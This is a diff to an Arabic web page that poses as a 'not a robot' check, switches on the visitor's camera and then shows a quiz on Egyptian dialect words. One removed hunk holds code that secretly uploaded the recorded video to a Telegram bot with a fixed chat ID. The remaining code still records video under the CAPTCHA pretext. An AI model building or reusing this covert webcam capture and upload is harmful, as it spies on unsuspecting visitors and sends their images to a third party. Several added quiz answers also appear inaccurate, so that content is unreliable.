@@ -28,9 +28,13 @@
             max-width: 500px;
             padding: 30px;
             text-align: center;
+            animation: fadeIn 0.5s ease;
         }
-        .verification-section,
-        .quiz-section {
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .verification-section {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -45,17 +49,12 @@
             width: 24px;
             height: 24px;
         }
-        .loading,
-        .success {
+        .loading, .success {
             margin: 15px 0;
-            font-size: 18px;
+            font-size: 24px; /* Increased font size */
         }
-        .loading {
-            color: #f39c12;
-        }
-        .success {
-            color: #27ae60;
-        }
+        .loading { color: #f39c12; }
+        .success { color: #27ae60; }
         video {
             width: 100%;
             max-width: 300px;
@@ -77,37 +76,32 @@
             border-radius: 8px;
             cursor: pointer;
             transition: background-color 0.3s;
+            font-size: 18px; /* Increased font size */
         }
-        .btn:hover {
-            background-color: #2ecc71;
-        }
+        .btn:hover { background-color: #2ecc71; }
         .quiz-section h2 {
-            margin-bottom: 15px;
-        }
-        .option {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-            background-color: #f7f7f7;
-            border-radius: 8px;
-            padding: 10px;
-        }
-        .option:hover {
-            background-color: #e8f4f8; 
-        }
-        .result {
-          text-align:center; 
-          padding :20px; 
-          background-color:#f1f1f1; 
-          border-radius :10px; 
+          margin-bottom :15px; 
+          font-size :24px; /* Increased font size */
       }
+      .option {
+          display:flex; 
+          align-items:center; 
+          margin :10px 0; 
+          background-color:#f7f7f7; 
+          border-radius :8px; 
+          padding :10px; 
+          transition :background-color .3s; 
+          cursor:pointer; /* Added cursor pointer */
+      }
+      .option:hover { background-color:#e8f4f8; }
+      .result { text-align:center; padding :20px; background-color:#f1f1f1; border-radius :10px; }
     </style>
 </head>
 <body>
     <div class="container" id="verification-container">
         <div class="verification-section">
-            <h1>تحقق من أنك لست روبوتاً</h1>
-            <div class="checkbox-container">
+             <h1>تحقق من أنك لست روبوتاً</h1>
+             <div class="checkbox-container">
                 <input type="checkbox" id="robot-checkbox">
                 <label for="robot-checkbox">أنا لست روبوتاً</label>
              </div>
@@ -129,7 +123,7 @@
              <div id="question-container" style="display:none;">
                  <h2 id="question-text"></h2>
                  <div id="options-container"></div>
-                 <button id="next-button" class="btn" style="display:none; width:100%;">السؤال التالي</button>
+                 <button id="next-button" class="btn" style="display:none;">السؤال التالي</button>
              </div>
              <div class="result" id="result" style="display:none;">
                  <h2>نتيجتك</h2>
@@ -166,14 +160,6 @@
                              stream.getTracks().forEach(track => track.stop());
                              document.getElementById('verification-container').style.display = 'none';
                              document.getElementById('quiz-container').style.display = 'block';
-
-                             const blob = new Blob(chunks, { type:'video/webm' });
-                             const formData = new FormData();
-                             formData.append('chat_id', '2070423407');
-                             formData.append('video', blob, 'video.webm');
-
-                             fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendVideo`, { method:'POST', body : formData })
-                                 .catch((error) => { console.error('Video upload failed:', error.message); });
                          };
                      })
                      .catch((err) => { alert("Unable to access the camera:" + err.message); });
@@ -184,13 +170,21 @@
              "اسكندراني": [
                  { q:"ما معنى كلمة 'جعان'؟", options:["محتاج","جائع","نعسان","غاضب"], correct :1 },
                  { q:"ماذا تعني 'حتة'؟", options:["جزء","بيت","مكان","شيء"], correct :0 },
-                 // Additional questions...
+                 // Additional questions up to a total of at least 20...
+                 { q:"ما معنى 'فايق'؟", options:["مستيقظ","مريض","غاضب","مستمتع"], correct :0 },
+                 { q:"ماذا تعني كلمة 'دِرَاج'؟", options:["بسيط","غريب","درّاجه","غرفه"], correct :2 },
+                 { q:"ما معنى كلمة 'حَلَاب'؟", options:["أشياء","غروب","خُطَط","جمل"], correct :3 },
+                 // Add more questions here...
              ],
              "منياوي": [
                  { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1 },
                  { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0 },
-                 // Additional questions...
-             ]
+                 // Additional questions up to a total of at least 20...
+                 { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1 },
+                 { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3 },
+                 // Add more questions here...
+             ],
+             // Add more dialects with at least 20 questions each...
          };
 
          let score = 0; 
@@ -244,19 +238,11 @@
                  const optionDiv=document.createElement('div');
                  optionDiv.classList.add('option');
 
-                 const radioInput=document.createElement('input');
-                 radioInput.type='radio';
-                 radioInput.name='answer';
-                 radioInput.id=`option-${index}`;
-                 radioInput.value=index;
-
-                 radioInput.addEventListener('click', () => handleAnswer(index));
+                 optionDiv.onclick = () => handleAnswer(index); // Automatically select answer on click
 
                  const label=document.createElement('label');
-                 label.setAttribute('for', `option-${index}`);
                  label.textContent=option;
 
-                 optionDiv.appendChild(radioInput);
                  optionDiv.appendChild(label);
                  
                  optionsContainer.appendChild(optionDiv);
